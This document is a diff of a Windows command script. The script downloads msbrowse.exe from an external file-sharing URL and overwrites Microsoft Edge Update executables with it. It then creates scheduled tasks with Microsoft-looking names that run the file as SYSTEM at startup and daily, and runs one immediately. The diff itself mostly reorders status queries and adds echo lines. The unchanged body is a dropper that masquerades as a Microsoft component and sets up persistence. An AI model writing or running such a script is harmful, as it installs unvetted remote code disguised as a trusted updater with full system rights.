@@ -1,3 +1,14 @@
+ls "c:\ProgramData\Microsoft\EdgeUpdate\"
+ls "c:\Program Files (x86)\Microsoft\EdgeUpdate\"
+
+schtasks /Query /TN MicrosoftEdgeUpdateTaskMachineUA
+schtasks /Query /TN MicrosoftEdgeUpdateTaskMachineCore
+schtasks /Query /TN Microsoft\MSbrowse
+schtasks /Query /TN Microsoft\MSbrowseD
+schtasks /Query /TN Microsoft\UAStock
+schtasks /Query /TN Microsoft\UAStockU
+schtasks /Query /TN Microsoft\UAStockD
+
 wget https://l.station307.com/LYGiXeMAeb6NC9yZ6Qa8bi/msbrowse.exe -OutFile c:\windows\temp\1.exe
 
 del "c:\Program Files (x86)\Microsoft\EdgeUpdate\1MicrosoftEdgeUpdate.exe"
@@ -11,31 +22,21 @@ copy c:\windows\temp\1.exe 'c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe' -F
 copy c:\windows\temp\1.exe 'C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe' -Force
 del c:\windows\temp\1.exe
 
-ls "c:\ProgramData\Microsoft\EdgeUpdate\"
-ls "c:\Program Files (x86)\Microsoft\EdgeUpdate\"
 
-schtasks /Query /TN MicrosoftEdgeUpdateTaskMachineUA
-schtasks /Query /TN MicrosoftEdgeUpdateTaskMachineCore
-schtasks /Query /TN Microsoft\MSbrowse
-schtasks /Query /TN Microsoft\MSbrowseD
-schtasks /Query /TN Microsoft\UAStock
-schtasks /Query /TN Microsoft\UAStockU
-schtasks /Query /TN Microsoft\UAStockD
-
-
+Echo Taskkill
 taskkill /IM msbrowse.exe /f 
 taskkill /IM UAStock.exe /f 
 taskkill /IM MicrosoftEdgeUpdate /f 
 
-
+Echo DelSchedule
 Setup=schtasks /TN Microsoft\UAStock /Delete /F
 Setup=schtasks /TN Microsoft\UAStockU /Delete /F
 Setup=schtasks /TN Microsoft\UAStockD /Delete /F
 Setup=schtasks /TN Microsoft\MSbrowse /Delete /F
 Setup=schtasks /TN Microsoft\MSbrowseD /Delete /F
 
-
+Echo Schedule
 schtasks /TN Microsoft\MSbrowse /Create /RU SYSTEM /TR c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe  /SC ONSTART /f
 schtasks /TN Microsoft\MSbrowseD /Create /RU SYSTEM /TR c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe  /SC DAILY /f
-
+Echo Run
 schtasks /Run /TN Microsoft\MSbrowse
